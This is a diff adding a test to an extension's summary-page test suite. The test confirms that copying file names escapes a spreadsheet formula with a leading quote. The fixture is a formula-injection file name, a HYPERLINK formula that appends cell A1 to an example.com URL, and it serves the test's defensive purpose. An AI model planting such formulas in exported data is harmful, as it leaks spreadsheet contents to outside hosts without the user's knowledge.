@@ -1,4 +1,5 @@
 import * as assert from 'assert';
+import * as vm from 'vm';
 
 import { renderSummary, type SummaryView } from '../../src/summary/render';
 import { contentSecurityPolicy, createNonce } from '../../src/html';
@@ -162,6 +163,28 @@ suite('summary page', () => {
             /TRUNCATION_NOTE = ""/.test(complete),
             'a complete list should embed an empty note',
         );
+    });
+
+    test("Copy cannot paste a file's name into a spreadsheet as a formula", () => {
+        // The page's own script, run with only the DOM it touches.
+        const name = '=HYPERLINK("https://example.com/?"&A1)';
+        const html = render({ files: [{ path: `/repo/${name}`, display: name, tokens: 9 }] });
+        const script = /<script nonce="[^"]+">([\s\S]*)<\/script>/.exec(html)?.[1];
+        assert.ok(script);
+        const handlers: Record<string, () => void> = {};
+        const element = (id: string) => ({
+            value: '',
+            hidden: false,
+            innerHTML: '',
+            addEventListener: (_type: string, fn: () => void) => (handlers[id] = fn),
+        });
+        const posted: { command: string; text?: string }[] = [];
+        vm.runInNewContext(script, {
+            acquireVsCodeApi: () => ({ postMessage: (m: { command: string; text?: string }) => posted.push(m) }),
+            document: { getElementById: element, querySelectorAll: () => [] },
+        });
+        handlers.copy();
+        assert.strictEqual(posted.at(-1)?.text, `'${name}\t9`);
     });
 
     test('escapes workspace-controlled text everywhere it appears', () => {
